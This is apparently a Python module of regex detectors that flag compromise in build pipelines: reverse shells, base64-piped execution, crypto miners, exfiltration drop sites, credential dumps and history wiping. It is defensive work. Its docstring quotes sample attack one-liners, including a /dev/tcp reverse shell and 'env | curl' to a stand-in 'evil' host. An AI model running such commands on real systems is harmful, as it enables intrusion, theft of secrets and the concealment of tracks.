"""Shared regexes for evidence-of-malicious-activity detection.

Distinct purpose from the hygiene rules (curl-pipe, TLS bypass, etc.):
those flag *risky defaults* that could one day be exploited; this
module flags *concrete evidence* that an attacker is already using
the pipeline (reverse shells, exfil channels, miner binaries,
obfuscated execution). Findings here are CRITICAL by design and
should gate merges on their own — the cost of a false-negative is
orders of magnitude worse than a false-positive.

Patterns are grouped into categories so a finding can name the
specific class of behaviour observed rather than just "something
suspicious":

    category         intent                                    example
    ---------------- ----------------------------------------- ---------------------------
    obfuscated-exec  base64/hex-decoded content piped to shell echo abc== | base64 -d | sh
    reverse-shell    outbound-connect-then-exec primitives     bash -i >& /dev/tcp/10.0.0.1/4444
    crypto-miner     known miner binaries / pool URLs          xmrig --url pool.minexmr.com
    exfil-channel    public drop sites for stolen data         curl -d @x discord.com/api/webhooks/
    credential-exfil env / /etc/shadow dumped to network       env | curl -d @- http://evil/
    audit-erasure    covering-tracks commands                  history -c && unset HISTFILE

Each pattern is narrow. A workflow can legitimately mention "curl"
or "base64"; only the *pipe-to-shell* form of base64 decoding counts
here. False-positive weight matters: an engineer teaching a new hire
by running ``echo hi | base64`` shouldn't trip a CRITICAL finding.
"""
from __future__ import annotations

import re
from dataclasses import dataclass


@dataclass(frozen=True)
class MaliciousPattern:
    """A single indicator of compromise.

    ``category`` is the bucket the finding rolls up to; ``name`` is
    the short label ("base64-decoded pipe to shell") that appears in
    the Finding description.
    """
    category: str
    name: str
    pattern: re.Pattern[str]


# ── Obfuscated execution ─────────────────────────────────────────────
_OBFUSCATED_EXEC: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "obfuscated-exec", "base64-decoded pipe to shell",
        re.compile(
            r"(?:echo|printf)\s+[\"']?[A-Za-z0-9+/=]{30,}[\"']?"
            r"\s*\|\s*base64\s+-d\s*\|\s*(?:ba|d|z|k|t?c)?sh\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "base64-decoded command substitution",
        re.compile(
            r"\$\(\s*(?:echo|printf)\s+[\"']?[A-Za-z0-9+/=]{30,}[\"']?"
            r"\s*\|\s*base64\s+-d\s*\)",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "PowerShell -enc base64 payload",
        re.compile(
            r"powershell(?:\.exe)?\s+[^;\n]*-[Ee][Nn][Cc]"
            r"(?:odedCommand)?\s+[A-Za-z0-9+/=]{30,}",
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "hex-decoded pipe to shell",
        re.compile(
            r"(?:echo|printf)\s+[\"']?(?:\\x[0-9a-f]{2}){10,}[\"']?"
            r"\s*\|\s*(?:ba|d|z|k|t?c)?sh\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "obfuscated-exec", "xxd-decoded pipe to shell",
        re.compile(
            r"\b(?:xxd|od|hexdump)\s+-[rR](?:\s+-p)?\s+[^|]*\|\s*(?:ba|d)?sh\b",
        ),
    ),
)


# ── Reverse shells ───────────────────────────────────────────────────
_REVERSE_SHELL: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "reverse-shell", "bash /dev/tcp reverse shell",
        re.compile(r"bash\s+-i\s*>&?\s*/dev/(?:tcp|udp)/\S+/\d+"),
    ),
    MaliciousPattern(
        "reverse-shell", "netcat -e reverse shell",
        re.compile(r"\bn(?:c|cat)\b\s+[^|\n]*?\s-e\s+/(?:bin|usr)/"),
    ),
    MaliciousPattern(
        "reverse-shell", "python socket+subprocess reverse shell",
        re.compile(
            r"python[23]?\s+-c\s+['\"]\s*import\s+socket"
            r"[^'\"]*(?:subprocess|os\.dup2)",
            re.DOTALL,
        ),
    ),
    MaliciousPattern(
        "reverse-shell", "mkfifo named-pipe reverse shell",
        re.compile(
            r"mkfifo\s+\S+[;\s]+.*(?:/bin/(?:ba)?sh)\s+-i[^|]*\|\s*(?:nc|ncat|openssl\s+s_client)",
            re.DOTALL,
        ),
    ),
    MaliciousPattern(
        "reverse-shell", "perl socket reverse shell",
        re.compile(
            r"perl\s+-e\s+['\"][^'\"]*use\s+Socket[^'\"]*exec\s*\(\s*['\"]/bin/",
            re.DOTALL,
        ),
    ),
)


# ── Crypto miners ────────────────────────────────────────────────────
_CRYPTO_MINER: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "crypto-miner", "xmrig miner binary",
        re.compile(r"\bxmrig\b(?:[^a-z]|$)", re.IGNORECASE),
    ),
    MaliciousPattern(
        "crypto-miner", "stratum mining pool URL",
        re.compile(r"\bstratum(?:\+ssl|\+tcp)?://", re.IGNORECASE),
    ),
    MaliciousPattern(
        "crypto-miner", "known mining pool hostname",
        re.compile(
            r"\b(?:pool\.minexmr\.com|supportxmr\.com|moneroocean\.stream"
            r"|nanopool\.org|ethermine\.org|f2pool\.com|2miners\.com"
            r"|minergate\.com|unmineable\.com)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "crypto-miner", "coinhive / cryptonight loader",
        re.compile(
            r"\b(?:coin-hive|cryptoloot|jsecoin|crypto-loot"
            r"|webminerpool|coinimp)\b",
            re.IGNORECASE,
        ),
    ),
)


# ── Exfil channels ───────────────────────────────────────────────────
_EXFIL_CHANNEL: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "exfil-channel", "Discord webhook POST",
        re.compile(r"discord(?:app)?\.com/api/webhooks/\d+/\S+", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "Telegram bot API POST",
        re.compile(r"api\.telegram\.org/bot\d+:[A-Za-z0-9_-]+/", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "anonymous file-drop site",
        re.compile(
            r"\b(?:transfer\.sh|0x0\.st|file\.io|bashupload\.com"
            r"|termbin\.com|oshi\.at|ttm\.sh|tb\.pypypy\.net"
            r"|paste\.ee|pastebin\.com/raw)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "exfil-channel", "webhook.site collector",
        re.compile(r"\bwebhook\.site/\b", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "OAST/Collaborator callback",
        re.compile(
            r"\b(?:oast\.(?:pro|fun|live|site|me|online|us)"
            r"|oastify\.com|interactsh-server|interactsh\.com"
            r"|burpcollaborator\.net|canarytokens\.com)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "exfil-channel", "Tor hidden-service URL",
        re.compile(r"\b[a-z2-7]{16,56}\.onion\b", re.IGNORECASE),
    ),
    MaliciousPattern(
        "exfil-channel", "DNS exfiltration via iodine/dnscat",
        re.compile(r"\b(?:iodine|dnscat2?)\b\s+[^-\s]", re.IGNORECASE),
    ),
)


# ── Credential exfil ────────────────────────────────────────────────
_CREDENTIAL_EXFIL: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "credential-exfil", "environment dumped to network",
        re.compile(
            r"(?:env|printenv|set)\s*(?:\|\s*(?:grep|awk|sed)[^|]*)?"
            r"\s*\|\s*(?:curl|wget|nc|ncat)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "credential-exfil", "/etc/passwd or /etc/shadow exfil",
        re.compile(
            r"(?:curl|wget|nc|ncat)\s+[^\n|]*\s(?:-d\s*@|--data-binary\s*@|<)?"
            r"\s*/etc/(?:passwd|shadow|group)",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "credential-exfil", "SSH private key read to network",
        re.compile(
            r"(?:cat|head|tail)\s+[~/.]+ssh/(?:id_(?:rsa|ed25519|ecdsa|dsa)"
            r"|authorized_keys)[^|\n]*\|\s*(?:curl|wget|nc|ncat)\b",
            re.IGNORECASE,
        ),
    ),
    MaliciousPattern(
        "credential-exfil", "AWS credentials file exfil",
        re.compile(
            r"(?:cat|head|tail)\s+[~/.]+aws/(?:credentials|config)"
            r"[^|\n]*\|\s*(?:curl|wget|nc|ncat)\b",
            re.IGNORECASE,
        ),
    ),
)


# ── Audit erasure ────────────────────────────────────────────────────
_AUDIT_ERASURE: tuple[MaliciousPattern, ...] = (
    MaliciousPattern(
        "audit-erasure", "shell history erasure",
        re.compile(r"history\s+-c\b|rm\s+[-f]*\s+~?/?\.bash_history\b"),
    ),
    MaliciousPattern(
        "audit-erasure", "HISTFILE / PROMPT_COMMAND unset",
        re.compile(
            r"(?:unset|export\s+-n)\s+"
            r"(?:HISTFILE|HISTSIZE|HISTFILESIZE|PROMPT_COMMAND)\b",
        ),
    ),
    MaliciousPattern(
        "audit-erasure", "systemd journal / syslog wipe",
        re.compile(
            r"journalctl\s+--(?:rotate|vacuum-(?:time|size))\s+--vacuum-time=1s"
            r"|(?:>|truncate\s+-s\s*0)\s+/var/log/(?:syslog|messages|auth\.log)",
        ),
    ),
)


ALL_PATTERNS: tuple[MaliciousPattern, ...] = (
    *_OBFUSCATED_EXEC,
    *_REVERSE_SHELL,
    *_CRYPTO_MINER,
    *_EXFIL_CHANNEL,
    *_CREDENTIAL_EXFIL,
    *_AUDIT_ERASURE,
)


def find_malicious_patterns(
    blob: str, *, suppress_examples: bool = True,
) -> list[tuple[str, str, str]]:
    """Return every matched pattern as ``(category, name, excerpt)``.

    ``excerpt`` is the literal text that matched, truncated to 120
    chars so the finding description stays printable. Matches are
    returned in discovery order (pattern-list order, then position
    within *blob*) so consumers can report the first N hits
    deterministically.

    When ``suppress_examples`` is True (the default), matches that
    appear inside a YAML/HCL key labelled as example/doc/fixture
    content, or next to inline example markers, are filtered out.
    Callers wanting the raw unsuppressed set (e.g. for regression
    tests) can pass ``suppress_examples=False``.
    """
    from ._context import looks_like_example  # local import to avoid cycle
    hits: list[tuple[str, str, str]] = []
    for p in ALL_PATTERNS:
        for m in p.pattern.finditer(blob):
            if suppress_examples and looks_like_example(blob, m.start()):
                continue
            excerpt = m.group(0)
            if len(excerpt) > 120:
                excerpt = excerpt[:117] + "..."
            hits.append((p.category, p.name, excerpt))
    return hits
